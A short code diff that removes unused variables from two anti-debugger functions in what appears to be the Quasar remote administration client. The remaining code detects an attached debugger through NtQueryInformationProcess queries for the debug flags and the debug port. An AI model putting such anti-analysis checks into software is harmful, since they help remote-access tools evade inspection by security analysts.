@@ -233,9 +233,6 @@ namespace Quasar.Client.Anti.Debugger
         public static bool NtQueryInformationProcessCheck_ProcessDebugFlags()
         {
             uint ProcessDebugFlags = 0;
-            uint Class = 0x1F;
-            uint Size = sizeof(uint);
-            uint Result = 0;
             NtQueryInformationProcess(new IntPtr(-1), 0x1F, out ProcessDebugFlags, sizeof(uint), 0);
             if (ProcessDebugFlags == 0)
                 return true;
@@ -253,7 +250,6 @@ namespace Quasar.Client.Anti.Debugger
             uint Size = sizeof(uint);
             if (Environment.Is64BitProcess)
                 Size = sizeof(uint) * 2;
-            uint Result = 0;
             NtQueryInformationProcess(new IntPtr(-1), 7, out DebuggerPresent, Size, 0);
             if (DebuggerPresent != 0)
                 return true;
